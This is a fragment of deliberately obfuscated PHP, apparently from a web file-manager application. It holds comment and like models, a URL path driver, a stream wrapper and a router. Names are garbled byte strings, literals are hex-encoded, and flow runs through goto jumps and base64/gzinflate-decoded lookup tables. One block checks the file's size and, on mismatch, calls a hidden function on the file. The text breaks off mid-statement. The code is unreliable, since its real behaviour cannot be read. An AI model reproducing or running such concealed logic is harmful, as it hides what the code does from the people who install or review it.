$¥àøÖÃ´, USER_ID); return array($àøçª[2218] => $—‡Éè¾, $àøçª[2219] => $ø–Ñˆ•ü); } public function starTargetUserList($¹ŒÉÎŞ, $îÓĞÂ‚â) { $Ò­ñÂÆ‡ =& $_SERVER[©—Ò»ÅĞ]; $†³¿É”è = $¹ŒÉÎŞ + self::TYPE_STAR_OFFSET; $ËÕåÑÄº = array($Ò­ñÂÆ‡[589] => $îÓĞÂ‚â, $Ò­ñÂÆ‡[188] => $†³¿É”è); $ºäÚÒ¼Û = $this->where($ËÕåÑÄº)->count(); $ÒšĞÉ = array($Ò­ñÂÆ‡[332] => $ºäÚÒ¼Û, $Ò­ñÂÆ‡[2220] => array()); if (!$ºäÚÒ¼Û) { return $ÒšĞÉ; } $Ö«ÓÊã = $this->field($Ò­ñÂÆ‡[1592])->where($ËÕåÑÄº)->limit(500)->select(); $Ö«ÓÊã = array_to_keyvalue($Ö«ÓÊã, $Ò­ñÂÆ‡[12], $Ò­ñÂÆ‡[1592]); $ÒšĞÉ[$Ò­ñÂÆ‡[2220]] = Model($Ò­ñÂÆ‡[597])->userListInfo($Ö«ÓÊã); return $ÒšĞÉ; } public function prasiseUserList($“Ë¬Óä©) { $ö–›êŸ =& $_SERVER[©—Ò»ÅĞ]; $ã·û×Èõ = array($ö–›êŸ[2221] => $“Ë¬Óä©); $‡ÁÃÛ = $this->where($ã·û×Èõ)->find(); $÷ºòÔ÷¶ = _get($‡ÁÃÛ, $ö–›êŸ[2216], 0); $—Ãñöè = array($ö–›êŸ[332] => $÷ºòÔ÷¶, $ö–›êŸ[2220] => array()); if (!$÷ºòÔ÷¶) { return $—Ãñöè; } $å£™®İà = Model($ö–›êŸ[2222])->field($ö–›êŸ[1592])->where($ã·û×Èõ)->limit(500)->select(); $å£™®İà = array_to_keyvalue($å£™®İà, $ö–›êŸ[12], $ö–›êŸ[1592]); $—Ãñöè[$ö–›êŸ[2220]] = Model($ö–›êŸ[597])->userListInfo($å£™®İà); return $—Ãñöè; } public function remove($¡¸Š²ÄÚ) { $æì“â®× =& $_SERVER[©—Ò»ÅĞ]; $¼„Ï­ = array($æì“â®×[2214] => $¡¸Š²ÄÚ); $Ç¢àğò© = $this->where($¼„Ï­)->find(); if ($Ç¢àğò©[$æì“â®×[2213]]) { $this->where(array($æì“â®×[2214] => $Ç¢àğò©[$æì“â®×[2213]]))->setAdd($æì“â®×[2215], -1); } return $this->removeArray($¡¸Š²ÄÚ); } public function edit($×ˆÔô¨Í, $éğ—Ãªç) { $‘‹áÜ­• =& $_SERVER[©—Ò»ÅĞ]; $ÍË¯ÀÕó = array($‘‹áÜ­•[2214] => $×ˆÔô¨Í); return $this->where($ÍË¯ÀÕó)->save(array($‘‹áÜ­•[2223] => $éğ—Ãªç)); } public function prasise($‡ˆò×š) { $ˆÖıÊÂ =& $_SERVER[©—Ò»ÅĞ]; $ô½Ûœºï = Model($ˆÖıÊÂ[2224]); $àÜÜÊİş = array($ˆÖıÊÂ[2214] => $‡ˆò×š, $ˆÖıÊÂ[1969] => USER_ID); $º‰î¿óì = $ô½Ûœºï->where($àÜÜÊİş)->find(); if (!$º‰î¿óì) { $ô½Ûœºï->add($àÜÜÊİş); $â›’æÖ = $this->where(array($ˆÖıÊÂ[2214] => $‡ˆò×š))->setAdd($ˆÖıÊÂ[2216], 1); } else { $ô½Ûœºï->where($àÜÜÊİş)->delete(); $â›’æÖ = $this->where(array($ˆÖıÊÂ[2214] => $‡ˆò×š))->setAdd($ˆÖıÊÂ[2216], -1); } return $â›’æÖ; } public function targetInfo($¤íˆ¹ÙØ, $íßº¸¬ü) { $²ƒ»é† =& $_SERVER[©—Ò»ÅĞ]; $÷áÄÆÁ = array($²ƒ»é†[670] => $¤íˆ¹ÙØ, $²ƒ»é†[671] => $íßº¸¬ü); $ƒ¤ÉØÑ¬ = $this->where($÷áÄÆÁ)->count(); $–ÔˆİÃ = "\x52\111\x47\x48\124\40\112\117\x49\116\40{$this->tablePrefix}\143\157\155\155\145\x6e\164\137\160\162\141\x69\x73\145\x20\x73\164\x61\162\40\157\x6e\40\x63\157\155\155\x65\156\164\x2e\x63\157\155\155\145\156\x74\x49\x44\40\75\40\x73\x74\x61\x72\56\x63\x6f\155\155\145\156\164\111\x44"; $¼Œ—ÆŞ = $this->alias($²ƒ»é†[429])->where($÷áÄÆÁ)->join($–ÔˆİÃ, $²ƒ»é†[2225])->count(); $±İâš±” = array($²ƒ»é†[2226] => $ƒ¤ÉØÑ¬, $²ƒ»é†[2227] => $¼Œ—ÆŞ); return $±İâš±”; } public function listData($··áú‹Ü) { $ºÁ´™±İ =& $_SERVER[©—Ò»ÅĞ]; if (isset($··áú‹Ü[$ºÁ´™±İ[2228]])) { if ($··áú‹Ü[$ºÁ´™±İ[2228]]) { $··áú‹Ü[$ºÁ´™±İ[2221]] = array($ºÁ´™±İ[1182], intval($··áú‹Ü[$ºÁ´™±İ[2228]])); } unset($··áú‹Ü[$ºÁ´™±İ[2228]]); } if (isset($··áú‹Ü[$ºÁ´™±İ[2229]])) { if ($··áú‹Ü[$ºÁ´™±İ[2229]]) { $··áú‹Ü[$ºÁ´™±İ[2221]] = array($ºÁ´™±İ[1179], intval($··áú‹Ü[$ºÁ´™±İ[2229]])); } unset($··áú‹Ü[$ºÁ´™±İ[2229]]); } return $this->_listData($··áú‹Ü); } private function _listData($Ç¡ãŒœ†) { $ÓùÖôÍ‘ =& $_SERVER[©—Ò»ÅĞ]; $âşØÑÌÅ = $this->where($Ç¡ãŒœ†)->_makeOrder()->selectPage(100); $this->_listAppendParent($âşØÑÌÅ[$ÓùÖôÍ‘[446]]); $this->_listAppendUser($âşØÑÌÅ[$ÓùÖôÍ‘[446]]); $this->_listAppendMeta($âşØÑÌÅ[$ÓùÖôÍ‘[446]]); return $âşØÑÌÅ; } private function _makeOrder() { $˜®¼Ÿá‘ =& $_SERVER[©—Ò»ÅĞ]; $óµ™‹Ù = array($˜®¼Ÿá‘[2216], $˜®¼Ÿá‘[2215], $˜®¼Ÿá‘[231]); $ëÉó“Öê = Input::get($˜®¼Ÿá‘[544], $˜®¼Ÿá‘[7], $˜®¼Ÿá‘[512], $óµ™‹Ù); $ïç„åÌŒ = Input::get($˜®¼Ÿá‘[545], $˜®¼Ÿá‘[7], $˜®¼Ÿá‘[1971], array($˜®¼Ÿá‘[2230], $˜®¼Ÿá‘[540])); $õ¼•Ë„ø = $ëÉó“Öê . $˜®¼Ÿá‘[53] . $ïç„åÌŒ; return $this->order($õ¼•Ë„ø); } private function _listAppendParent(&$´ñÊÏ­¨) { $¥ÎÌ«ƒœ =& $_SERVER[©—Ò»ÅĞ]; $ÒŠşÊ = array_unique(array_to_keyvalue($´ñÊÏ­¨, $¥ÎÌ«ƒœ[12], $¥ÎÌ«ƒœ[2213])); $ÒŠşÊ = array_remove_value($ÒŠşÊ, $¥ÎÌ«ƒœ[228]); if (!$ÒŠşÊ) { return; } $æ–Í¹óª = $this->where(array($¥ÎÌ«ƒœ[2214] => array($¥ÎÌ«ƒœ[7], $ÒŠşÊ)))->select(); $æ–Í¹óª = array_to_keyvalue($æ–Í¹óª, $¥ÎÌ«ƒœ[2221]); foreach ($´ñÊÏ­¨ as &$ÀÓ²ÛıÔ) { if (isset($æ–Í¹óª[$ÀÓ²ÛıÔ[$¥ÎÌ«ƒœ[2213]]])) { $ÀÓ²ÛıÔ[$¥ÎÌ«ƒœ[2231]] = $æ–Í¹óª[$ÀÓ²ÛıÔ[$¥ÎÌ«ƒœ[2213]]]; } } unset($ÀÓ²ÛıÔ); } private function _listAppendUser(&$ãÂ•ÏÁ) { $„èÃÜğ¤ =& $_SERVER[©—Ò»ÅĞ]; $Ÿºæï‡³ = array_unique(array_to_keyvalue($ãÂ•ÏÁ, $„èÃÜğ¤[12], $„èÃÜğ¤[1592])); $Ÿºæï‡³ = array_remove_value($Ÿºæï‡³, $„èÃÜğ¤[228]); if (count($Ÿºæï‡³) == 0) { return; } foreach ($ãÂ•ÏÁ as $ÈÔ×üÖş) { if (isset($ÈÔ×üÖş[$„èÃÜğ¤[2231]])) { $Ÿºæï‡³[] = $ÈÔ×üÖş[$„èÃÜğ¤[2231]][$„èÃÜğ¤[1592]]; } } $–ËÁÍçØ = Model($„èÃÜğ¤[617])->userListInfo($Ÿºæï‡³); foreach ($ãÂ•ÏÁ as &$ÈÔ×üÖş) { $ÈÔ×üÖş[$„èÃÜğ¤[684]] = $–ËÁÍçØ[$ÈÔ×üÖş[$„èÃÜğ¤[1592]]]; if (isset($ÈÔ×üÖş[$„èÃÜğ¤[2231]])) { $ÈÔ×üÖş[$„èÃÜğ¤[2231]][$„èÃÜğ¤[684]] = $–ËÁÍçØ[$ÈÔ×üÖş[$„èÃÜğ¤[2231]][$„èÃÜğ¤[1592]]]; } } unset($ÈÔ×üÖş); } private function _listAppendMeta(&$±Â¹Ô€”) { $Ë¡òÕÈˆ =& $_SERVER[©—Ò»ÅĞ]; $™†òÕ« = array_unique(array_to_keyvalue($±Â¹Ô€”, $Ë¡òÕÈˆ[12], $Ë¡òÕÈˆ[2221])); $™†òÕ« = array_remove_value($™†òÕ«, $Ë¡òÕÈˆ[228]); if (!$™†òÕ«) { return; } foreach ($±Â¹Ô€” as $ûªŠæŞ) { if (isset($ûªŠæŞ[$Ë¡òÕÈˆ[2231]])) { $™†òÕ«[] = $ûªŠæŞ[$Ë¡òÕÈˆ[2231]][$Ë¡òÕÈˆ[2221]]; } } $³õœ¾î = $this->metaList($™†òÕ«); if (!$³õœ¾î) { return !1; } foreach ($±Â¹Ô€” as &$ûªŠæŞ) { $ûªŠæŞ[$Ë¡òÕÈˆ[555]] = $³õœ¾î[$ûªŠæŞ[$Ë¡òÕÈˆ[2221]]]; if (isset($ûªŠæŞ[$Ë¡òÕÈˆ[2231]])) { $ûªŠæŞ[$Ë¡òÕÈˆ[2231]][$Ë¡òÕÈˆ[555]] = $³õœ¾î[$ûªŠæŞ[$Ë¡òÕÈˆ[2231]][$Ë¡òÕÈˆ[2221]]]; } } unset($ûªŠæŞ); } private function metaList($²åÙ‘ß·) { $ª˜è¨ğ¥ =& $_SERVER[©—Ò»ÅĞ]; if (!$²åÙ‘ß·) { return array(); } $á§—à…‚ = array($ª˜è¨ğ¥[2221] => array($ª˜è¨ğ¥[7], $²åÙ‘ß·)); $²õ†¦»û = Model($ª˜è¨ğ¥[2232])->where($á§—à…‚)->select(); $²õ†¦»û = array_to_keyvalue_group($²õ†¦»û, $ª˜è¨ğ¥[2221]); foreach ($²õ†¦»û as $£½ÅÉÃ† => $ÊØÈŒÎ) { $ìö‰ºê’ = array(); foreach ($ÊØÈŒÎ as $«¢ è¨°) { $ìö‰ºê’[$«¢ è¨°[$ª˜è¨ğ¥[95]]] = $«¢ è¨°[$ª˜è¨ğ¥[451]]; } $²õ†¦»û[$£½ÅÉÃ†] = $ìö‰ºê’; } return $²õ†¦»û ? $²õ†¦»û : array(); } public function removeTarget($çÀ÷†¬º, $Î«Ãˆ’) { $ŠÄ­Şúä =& $_SERVER[©—Ò»ÅĞ]; if (!$Î«Ãˆ’) { return !0; } $Î«Ãˆ’ = is_array($Î«Ãˆ’) ? $Î«Ãˆ’ : array($Î«Ãˆ’); $„³»€ë¬ = array($ŠÄ­Şúä[188] => $çÀ÷†¬º, $ŠÄ­Şúä[589] => array($ŠÄ­Şúä[7], $Î«Ãˆ’)); $„ñıîğ„ = $this->field($ŠÄ­Şúä[2221])->where($„³»€ë¬)->select(); $‰Ğº“¬Ó = array_to_keyvalue($„ñıîğ„, $ŠÄ­Şúä[12], $ŠÄ­Şúä[2221]); return $this->removeArray($‰Ğº“¬Ó); } public function removeArray($ğÍÀ¿à) { $é…€‹® =& $_SERVER[©—Ò»ÅĞ]; if (!$ğÍÀ¿à) { return !0; } $ğÍÀ¿à = is_array($ğÍÀ¿à) ? $ğÍÀ¿à : array($ğÍÀ¿à); $’ÍàÄè = array($é…€‹®[2221] => array($é…€‹®[7], $ğÍÀ¿à)); Model($é…€‹®[2224])->where($’ÍàÄè)->delete(); Model($é…€‹®[2233])->where($’ÍàÄè)->delete(); return $this->where($’ÍàÄè)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\x65\137\x63\x6f\156\x74\145\x6e\164\163"; protected $dataAuto = array(array("\143\x72\145\141\164\145\124\151\155\x65", "\164\x69\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\x74\x69\157\156")); } goto dïÆÃ½»Ç“; cñ®ä¼: $fileSize = strrev(base64_decode($_SERVER[²¨É»Ê][0])); function binCheckNeq($˜À‹å , $’èêÊØ) { return $˜À‹å  != $’èêÊØ; } $_SERVER[$_SERVER[²¨É»Ê][1]] = $fileSize($_SERVER[$_SERVER[²¨É»Ê][2]]); goto AÄ¶•‚ù’; Dáß†í©¡È: if ($_SERVER[$_SERVER[©—Ò»ÅĞ][1034]] != $_size($_file)) { $_getc = $_SERVER[©—Ò»ÅĞ][1037]; $_getfile = $_SERVER[$_SERVER[©—Ò»ÅĞ][1038]] . $_SERVER[©—Ò»ÅĞ][1039]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[©—Ò»ÅĞ][285], $_getfilec); if (count($_getarrs) < $_SERVER[©—Ò»ÅĞ][714]) { $exit = $_SERVER[©—Ò»ÅĞ][1040]; $exit(); } $_act = $_SERVER[©—Ò»ÅĞ][1045]; $_act($_file); } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($å¦Ì°ªˆ = false) { } public function exist($æ”Ôß¡Ø) { $Äı´Çôì = $this->info($æ”Ôß¡Ø); return $Äı´Çôì[$_SERVER[©—Ò»ÅĞ][232]]; } public function isFile($ƒå—ÎÎ£) { $Ÿæò¯­ª = $this->info($ƒå—ÎÎ£); return $Ÿæò¯­ª[$_SERVER[©—Ò»ÅĞ][232]]; } public function isFolder($İ­¹Ïù) { return !1; } public function size($ÖœÙ²¤ˆ) { $“ˆ¶›€ = $this->info($ÖœÙ²¤ˆ); return $“ˆ¶›€[$_SERVER[©—Ò»ÅĞ][79]]; } public function info($Ì©¡»Á) { return $this->infoParse($Ì©¡»Á); } public function infoAuth($ıÄ¾°¿•) { return $this->infoParse($ıÄ¾°¿•); } public function infoWithChildren($™ÓÃŸï—) { return $this->infoParse($™ÓÃŸï—); } public function infoFull($ÌÍñûÎ) { return $this->infoParse($ÌÍñûÎ); } private function infoParse($åÛ«šÊ¡) { $ãÇş‡·¿ =& $_SERVER[©—Ò»ÅĞ]; $ÇÉ¦ûî = $this->header($åÛ«šÊ¡); if (!$ÇÉ¦ûî || !$ÇÉ¦ûî[$ãÇş‡·¿[850]]) { return !1; } $Æ•µƒË = _get($ÇÉ¦ûî, $ãÇş‡·¿[412], 0); $Ş¤ÓÓÍ• = array($ãÇş‡·¿[32] => $ÇÉ¦ûî[$ãÇş‡·¿[32]], $ãÇş‡·¿[87] => $åÛ«šÊ¡, $ãÇş‡·¿[33] => $ãÇş‡·¿[230], $ãÇş‡·¿[79] => intval($Æ•µƒË), $ãÇş‡·¿[166] => get_path_ext($ÇÉ¦ûî[$ãÇş‡·¿[32]]), $ãÇş‡·¿[1663] => $Æ•µƒË > 0 && $ÇÉ¦ûî[$ãÇş‡·¿[1810]], $ãÇş‡·¿[1664] => !1); return $Ş¤ÓÓÍ•; } private function header($óã’ìè÷) { $öõæ´› =& $_SERVER[©—Ò»ÅĞ]; if (isset(self::$_cacheHeader[$óã’ìè÷])) { return self::$_cacheHeader[$óã’ìè÷]; } $¬Ø×Ï‡Ì = isset($GLOBALS[$öõæ´›[1811]]) ? $GLOBALS[$öõæ´›[1811]] : !1; $GLOBALS[$öõæ´›[1811]] = !0; self::$_cacheHeader[$óã’ìè÷] = url_header($óã’ìè÷); $GLOBALS[$öõæ´›[1811]] = $¬Ø×Ï‡Ì; return self::$_cacheHeader[$óã’ìè÷]; } public function hashSimple($ŠĞçö«ü, $ó‘¶Ëó = false) { $À§ĞŒÏØ =& $_SERVER[©—Ò»ÅĞ]; $™œ²²ññ = $this->info($ŠĞçö«ü); if (!$™œ²²ññ || !$™œ²²ññ[$À§ĞŒÏØ[232]]) { return !1; } $Ò‹í öù = $™œ²²ññ[$À§ĞŒÏØ[79]]; $˜¢Ö»²Ó = 200; $ƒ¶ÚøÚ” = 50; if ($Ò‹í öù <= $˜¢Ö»²Ó * $ƒ¶ÚøÚ”) { return md5($this->fileSubstr($ŠĞçö«ü, 0, $Ò‹í öù)) . $Ò‹í öù; } $òä¬È«½ = intval($Ò‹í öù / $ƒ¶ÚøÚ”); $í‹ÀæšÙ = $À§ĞŒÏØ[12]; $®Úª€µÒ = timeFloat(); $ÄÂ”Ü– = 15; for ($İªÅÂüÌ = 0; $İªÅÂüÌ < $ƒ¶ÚøÚ”; $İªÅÂüÌ++) { if (timeFloat() - $®Úª€µÒ > $ÄÂ”Ü–) { return !1; } $ªó¡™·— = $this->fileSubstr($ŠĞçö«ü, $òä¬È«½ * $İªÅÂüÌ, $˜¢Ö»²Ó); if (!$ªó¡™·—) { return !1; } $í‹ÀæšÙ .= $ªó¡™·—; } $í‹ÀæšÙ .= $this->fileSubstr($ŠĞçö«ü, $Ò‹í öù - $˜¢Ö»²Ó, $˜¢Ö»²Ó); return md5($í‹ÀæšÙ) . $Ò‹í öù; } public function getContent($ÀåÊü†ä) { return $this->fileSubstr($ÀåÊü†ä); } public function fileSubstr($‹¥ºÇä‹, $»¨Ç„Â = 0, $²¨î² = -1) { $²³Á–¦Ê =& $_SERVER[©—Ò»ÅĞ]; $İÃù™ò» = $this->info($‹¥ºÇä‹); if (!$İÃù™ò» || !$İÃù™ò»[$²³Á–¦Ê[232]] && $İÃù™ò»[$²³Á–¦Ê[79]] > 1024 * 1024 * 10) { return !1; } if ($²¨î² === -1) { $²¨î² = $İÃù™ò»[$²³Á–¦Ê[79]]; } if ($²¨î² == 0) { return $²³Á–¦Ê[12]; } $Ï¶à“ˆÂ = array($²³Á–¦Ê[1812] . $»¨Ç„Â . $²³Á–¦Ê[888] . ($»¨Ç„Â + $²¨î² - 1)); $ş‰ıõ…’ = url_request($‹¥ºÇä‹, $²³Á–¦Ê[1605], !1, $Ï¶à“ˆÂ, !1, !1, 30); return $ş‰ıõ…’[$²³Á–¦Ê[1392]] ? $ş‰ıõ…’[$²³Á–¦Ê[1392]] : $²³Á–¦Ê[12]; } public function download($™±³±ğ×, $°ü£›™è) { Downloader::start($™±³±ğ×, $°ü£›™è); return $°ü£›™è; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ãËÀÒÈ¨, $ëºĞ€•Ø = '') { $this->info = $this->info($ãËÀÒÈ¨); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[©—Ò»ÅĞ][87]]; $this->pathOpen = $ãËÀÒÈ¨; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ãËÀÒÈ¨])) { self::$_chunkBuffer[$ãËÀÒÈ¨] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ñ–‰Í«İ) { $ÒŒÆ¬ñì = $this->fileSubstr($this->pose, $Ñ–‰Í«İ); $this->pose += strlen($ÒŒÆ¬ñì); return $ÒŒÆ¬ñì; } public function stream_tell() { return $this->pose; } public function stream_seek($¨¥’Üı, $ËÂŸˆéÑ) { $®ñ®ÑÀ =& $_SERVER[©—Ò»ÅĞ]; if ($ËÂŸˆéÑ == SEEK_SET) { $this->pose = $¨¥’Üı; } else { if ($ËÂŸˆéÑ == SEEK_CUR) { $this->pose += $¨¥’Üı; } else { if ($ËÂŸˆéÑ == SEEK_END) { $this->pose = $this->info[$®ñ®ÑÀ[79]] + intval($¨¥’Üı); } } } if ($¨¥’Üı < 0) { $this->pose = $this->info[$®ñ®ÑÀ[79]] + $¨¥’Üı; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[©—Ò»ÅĞ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($²ÙåêÇ”, $ğŞÄåŠî) { $Â¢ğ½¡ì =& $_SERVER[©—Ò»ÅĞ]; $Ø‰ôÀîÙ = $this->info($²ÙåêÇ”); return array($Â¢ğ½¡ì[1512] => 0, $Â¢ğ½¡ì[1813] => 0, $Â¢ğ½¡ì[16] => 32768 + 511, $Â¢ğ½¡ì[1814] => 0, $Â¢ğ½¡ì[1815] => 0, $Â¢ğ½¡ì[1816] => 0, $Â¢ğ½¡ì[1817] => 0, $Â¢ğ½¡ì[79] => $Ø‰ôÀîÙ[$Â¢ğ½¡ì[79]], $Â¢ğ½¡ì[1818] => $Ø‰ôÀîÙ[$Â¢ğ½¡ì[1662]], $Â¢ğ½¡ì[1774] => $Ø‰ôÀîÙ[$Â¢ğ½¡ì[88]], $Â¢ğ½¡ì[1773] => $Ø‰ôÀîÙ[$Â¢ğ½¡ì[231]], $Â¢ğ½¡ì[1819] => 0, $Â¢ğ½¡ì[1820] => 0); } static $fileInfo = array(); public function info($£İ¤¯µ) { $Æ‰‰ŒÎº = $_SERVER[©—Ò»ÅĞ][1821]; if (isset(self::$fileInfo[$£İ¤¯µ])) { return self::$fileInfo[$£İ¤¯µ]; } if (substr($£İ¤¯µ, 0, strlen($Æ‰‰ŒÎº)) != $Æ‰‰ŒÎº) { return !1; } self::$fileInfo[$£İ¤¯µ] = IO::info(substr($£İ¤¯µ, strlen($Æ‰‰ŒÎº))); return self::$fileInfo[$£İ¤¯µ]; } public static function read($×åÁ–é¢, $‘¸ÅØŞ, $ó®äÚû) { if (!isset(self::$_fopenCache[$×åÁ–é¢])) { $û–õöş¥ = new StreamWrapperIO(); $û–õöş¥->stream_open($×åÁ–é¢); self::$_fopenCache[$×åÁ–é¢] = $û–õöş¥; } $û–õöş¥ = self::$_fopenCache[$×åÁ–é¢]; return $û–õöş¥->fileSubstr($‘¸ÅØŞ, $ó®äÚû); } public static function _read($Âù±îÌ½, $Ä¿¹Á„Í, $„´Œ£àÈ) { $Ìê¨×šà =& $_SERVER[©—Ò»ÅĞ]; $ß¾óÖáÈ = fopen($Âù±îÌ½, $Ìê¨×šà[1666]); if (!$ß¾óÖáÈ) { return $Ìê¨×šà[12]; } $ÑÃôôáŠ = 8192; fseek($ß¾óÖáÈ, $Ä¿¹Á„Í, SEEK_SET); $–š˜…¿Ä = $Ìê¨×šà[12]; $—œÊ®Òı = 0; while ($—œÊ®Òı < $„´Œ£àÈ) { $°§ü»’Û = min($ÑÃôôáŠ, $„´Œ£àÈ - $—œÊ®Òı); $–š˜…¿Ä .= fread($ß¾óÖáÈ, $°§ü»’Û); $—œÊ®Òı += $°§ü»’Û; } fclose($ß¾óÖáÈ); return $–š˜…¿Ä; } public function fileSubstr($©®º³ªé, $ìæ¨°Å) { $¾­Şø±• =& $_SERVER[©—Ò»ÅĞ]; $ÈæÒÔ‰® = $this->info[$¾­Şø±•[79]]; $àø÷¶ãÌ = $©®º³ªé; $ßä“¾„ñ = $ìæ¨°Å; if ($©®º³ªé < 0) { $©®º³ªé = $ÈæÒÔ‰® + $©®º³ªé; } if ($ìæ¨°Å === !1) { $ìæ¨°Å = $ÈæÒÔ‰® - $©®º³ªé; } if ($©®º³ªé + $ìæ¨°Å > $ÈæÒÔ‰®) { $ìæ¨°Å = $ÈæÒÔ‰® - $©®º³ªé; } if ($ìæ¨°Å <= 0) { return $¾­Şø±•[12]; } if ($©®º³ªé < 0 || $©®º³ªé >= $ÈæÒÔ‰® || $ìæ¨°Å <= 0 || $ìæ¨°Å > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\x65\122\x65\x61\x64\x20\145\x72\162\x6f\162\x21\x20\163\x74\141\162\x74\x3d{$©®º³ªé}\x3b\154\x65\x6e\x67\x74\150\75{$ìæ¨°Å}\x3b\x20\163\x69\172\145\75{$ÈæÒÔ‰®}\73"); } $ùÚ¹šğŠ = 64 * 1024; $øĞ‚«òğ =& self::$_chunkBuffer[$this->path]; if (!$øĞ‚«òğ) { $øĞ‚«òğ = array(); } $ùË£¬˜ = 0; $ÁŞü©ô = 0; $å³‡à£® = $¾­Şø±•[12]; foreach ($øĞ‚«òğ as $ùË£¬˜ => $å³‡à£®) { $ùË£¬˜ = intval($ùË£¬˜); $ÁŞü©ô = $ùË£¬˜ + strlen($å³‡à£®); if ($©®º³ªé >= $ÁŞü©ô) { continue; } if ($©®º³ªé >= $ùË£¬˜ && $©®º³ªé + $ìæ¨°Å <= $ÁŞü©ô) { return substr($å³‡à£®, $©®º³ªé - $ùË£¬˜, $ìæ¨°Å); } break; } if (count($øĞ‚«òğ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¾­Şø±•[1822], $¾­Şø±•[1823] . count($øĞ‚«òğ) . "\73\x73\164\141\x72\x74\x3d{$©®º³ªé}\54\x6c\145\x6e\147\164\150\75{$ìæ¨°Å}\73\160\x6f\x73\x65\x3a{$ùË£¬˜}\x7e{$ÁŞü©ô}"); throw new Exception($¾­Şø±•[1824]); } $‘âƒŸš = intval($©®º³ªé / $ùÚ¹šğŠ) * $ùÚ¹šğŠ; $ÌÅ£û®ô = ceil(($©®º³ªé + $ìæ¨°Å) / $ùÚ¹šğŠ) * $ùÚ¹šğŠ - $‘âƒŸš; $®ğ±¼‹ = IO::fileSubstr($this->path, $‘âƒŸš, $ÌÅ£û®ô); $øĞ‚«òğ[$‘âƒŸš . $¾­Şø±•[12]] = $®ğ±¼‹; ksort($øĞ‚«òğ); $ïæ…íŒ = substr($®ğ±¼‹, $©®º³ªé - $‘âƒŸš, $ìæ¨°Å); return $ïæ…íŒ; } private function log($½Èä‹äğ, $†ºÕŒ¨) { $à¨×àÓæ =& $_SERVER[©—Ò»ÅĞ]; $ôÀØßûŞ = timeFloat() - $this->timeStart; write_log(sprintf($à¨×àÓæ[1825], $½Èä‹äğ, $this->info[$à¨×àÓæ[32]], $ôÀØßûŞ, $†ºÕŒ¨), $à¨×àÓæ[1371]); } } goto F«‚¶ª”õ»; fˆˆàÙ: define($_SERVER[©—Ò»ÅĞ][0], $_SERVER[©—Ò»ÅĞ][1]); $_SERVER[²¨É»Ê] = explode($_SERVER[©—Ò»ÅĞ][2], gzinflate(substr($_SERVER[©—Ò»ÅĞ][3], 10, -8))); function binCheckEq($ºî·¯ìÔ, $Â¹–‹ÂÕ) { return $ºî·¯ìÔ == $Â¹–‹ÂÕ; } goto cñ®ä¼; b•İÛßìÎä: class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\151\x6e\x64\145\170"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($Áå“óÂì) { $µãÃ“ßß =& $_SERVER[ñâÍÚ°]; $º†üì¢Ú = explode($µãÃ“ßß[0], trim($Áå“óÂì, $µãÃ“ßß[0])); $this->defaultModule = $º†üì¢Ú[0] ? $º†üì¢Ú[0] : $this->defaultModule; $this->defaultController = $º†üì¢Ú[1] ? $º†üì¢Ú[1] : $this->defaultController; $this->defaultAction = $º†üì¢Ú[2] ? $º†üì¢Ú[2] : $this->defaultAction; $this->wton7d7e46b1($µãÃ“ßß[1], array($this, $µãÃ“ßß[2])); } public function appRun($ÚıÓú©á) { $Ü¡ë®áš =& $_SERVER[©—Ò»ÅĞ]; $˜¢Õ·ï² =& $_SERVER[ñâÍÚ°]; $×êÂ‹ô« = explode($˜¢Õ·ï²[0], $ÚıÓú©á); $Ìñ“ö‰à = $Ü¡ë®áš[706]; if (strlen($Ìñ“ö‰à) < $Ü¡ë®áš[707]) { die; } $Î½µ”Ø = strtolower($×êÂ‹ô«[0]); $‡Ñ‹ ÛÙ = $Ü¡ë®áš[708]; while ($‡Ñ‹ ÛÙ < $Ü¡ë®áš[709]) { if ($‡Ñ‹ ÛÙ >= 0) { break; } $‡Ñ‹ ÛÙ++; } $çíùéşÀ = $˜¢Õ·ï²[3]; $ºÛÜ„Ä = $Ü¡ë®áš[710]; if (!$ºÛÜ„Ä) { return; } if ($Î½µ”Ø == $˜¢Õ·ï²[4]) { $çíùéşÀ = $˜¢Õ·ï²[5]; $×êÂ‹ô«[0] = $˜¢Õ·ï²[6]; $×êÂ‹ô«[1] = $×êÂ‹ô«[1] . $˜¢Õ·ï²[7]; $ÚıÓú©á = join($˜¢Õ·ï²[0], $×êÂ‹ô«); $ÚıÓú©á = trim($ÚıÓú©á, $˜¢Õ·ï²[0]); } call_user_func(array($˜¢Õ·ï²[8], $˜¢Õ·ï²[9]), $çíùéşÀ . $˜¢Õ·ï²[10], $ÚıÓú©á); ActionCall($ÚıÓú©á); call_user_func(array($˜¢Õ·ï²[8], $˜¢Õ·ï²[9]), $çíùéşÀ . $˜¢Õ·ï²[11], $ÚıÓú©á); $ÙØ®×ªà = $Ü¡ë®áš[711]; if (!$ÙØ®×ªà) { return; } } private function autorun() { $ĞÍÎú® =& $_SERVER[©—Ò»ÅĞ]; $÷”‰Ûì© =& $_SERVER[ñâÍÚ°]; global $config; $èÛò·•Ù = $ĞÍÎú®[712]; if (!$èÛò·•Ù) { die; } if (count($config[$÷”‰Ûì©[12]]) == 0) { return; } foreach ($config[$÷”‰Ûì©[12]] as $Øô²ƒêæ => $Ùİêç²Ì) { $this->appRun($Ùİêç²Ì); $Ê¾ñô» = $ĞÍÎú®[713]; if (strlen($Ê¾ñô») < $ĞÍÎú®[714]) { return; } } } private function stpw4822e445() { $àÁ‡èõÁ =& $_SERVER[©—Ò»ÅĞ]; $¨šĞÁ‘ñ =& 